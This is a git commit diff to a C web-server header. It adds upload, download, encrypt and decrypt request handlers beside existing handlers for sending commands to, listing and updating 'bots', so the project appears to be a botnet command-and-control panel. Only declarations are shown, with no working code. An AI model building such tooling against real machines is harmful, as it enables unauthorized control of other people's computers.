09e52ad8c6b12a071a310f74eade581b4026f31b
Mist3rshift | Alan BELLEC <alanbellec2@gmail.com>
2025-06-01 11:18:42 +0200

    [feat] adding server call for encrypt and decrypt

--- include/server/web_server.h
+++ include/server/web_server.h
@@ -7,6 +7,10 @@
 
 void handle_request(struct mg_connection *c, int ev, void *ev_data);
 void handle_send_command(struct mg_connection *c, struct mg_http_message *hm);
+void handle_upload_request(struct mg_connection *c, struct mg_http_message *hm);
+void handle_download_request(struct mg_connection *c, struct mg_http_message *hm);
+void handle_encrypt_request(struct mg_connection *c, struct mg_http_message *hm);
+void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm);
 void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm);
 // Use dependency injection for tests
 void handle_server_status(
@@ -16,6 +20,7 @@ void handle_server_status(
     int (*connect_func)(int, const struct sockaddr *, socklen_t),
     void (*reply_func)(struct mg_connection *, int, const char *, const char *, ...)
 );
+
 void handle_update_bots(struct mg_connection *c, struct mg_http_message *hm);
 void handle_get_bot_file(struct mg_connection *c, struct mg_http_message *hm); // New function
 void *start_web_interface(void *arg);
